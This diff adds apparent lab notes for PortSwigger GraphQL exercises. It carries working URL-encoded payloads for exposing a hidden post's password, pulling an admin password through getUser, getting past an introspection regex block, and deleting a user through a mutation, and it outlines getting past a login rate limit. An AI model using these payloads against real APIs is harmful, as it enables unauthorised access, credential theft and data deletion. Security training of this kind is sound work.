@@ -1,0 +1,80 @@
+
+
+#Accessing private GraphQL posts.
+
+	In the response to the GraphQL query, each blog post has its own sequential id.
+		blog post id 3 is missing from the list. This indicates that there is a hidden blog post.
+
+	In the response to the "GraphQL query", each blog post has its own sequential id.
+		blog post id 3 is missing from the list. This indicates that there is a hidden blog post.
+
+	In the HTTP history find the relevant GraphQL query. 
+		right-click it and select Send to Repeater. In Repeater, modify the id variable to 3. Add the postPassword field to the query.
+
+
+#Accidental exposure of private GraphQL fields.
+		
+	Use InQL to scan the GraphQL endpoint 
+		getUser query that returns a user username and password.	default id is 1334 used.
+			send getUser.query to repeater, modify the getUser Id to 1 (One)
+				get the administrator password 
+			
+			
+#Finding a hidden GraphQL endpoint.
+
+	In Repeater, send requests to some common GraphQL endpoint suffixes and inspect the results. i.e /graphql/api.. gql/api.. gql/gql
+		Note that when you send a GET request to /api the response contains a "Query not present" error. 
+			This hints that there may be a GraphQL endpoint responding to GET requests at this location
+
+	amend the request to contain a universal query. 
+				
+		/api?query=query{__typename}
+
+
+	send a new request with a URL-encoded introspection query as a query parameter.
+				
+		/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
+				Notice from the response that introspection is disallowed.
+
+	modify the query to include a newline character after __schema and resend.
+		/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
+		
+	notice that the response now includes full introspection details.
+		 This is because the server is configured to exclude queries matching the regex "__schema{"
+		 
+	save the introspection response body as a local JSON file.
+		go to the InQL Scanner tab and scan the saved file.
+			Browse the schema and find the "getUser" query.
+
+
+	In Repeater, send the getUser query to the endpoint you discovered. Note that you need to convert the query to URL encoding
+			    /api?query=query%20%7B%0A%09getUser(id%3A1334)%20%7B%0A%09%09id%0A%09%09username%0A%09%7D%0A%7D
+
+			Change Id number to 3, here 1334 is used. 
+	
+
+	In Repeater, send a deleteOrganizationUser mutation with a user ID of 3 to delete carlos and solve the lab.
+		    /api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D
+
+
+
+#Bypassing GraphQL brute force protections
+
+	[The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time]
+	
+		Try loging using fake-credentials for multiple times. observed that login has been blocked.
+		
+		
+	remove the "Session-Cookie" and copy the testing credential shared by portswigger.
+		double paste it to browser console, then result shows it as JSON format.
+			go to google searching "GraphQL to JSON body converter"
+			
+			
+		remove the JSON format request body or modify it to InQL console
+			add "mutation" before JSON Body
+			
+			find the bruteforce7, which returns True
+		
+			
+		
+		
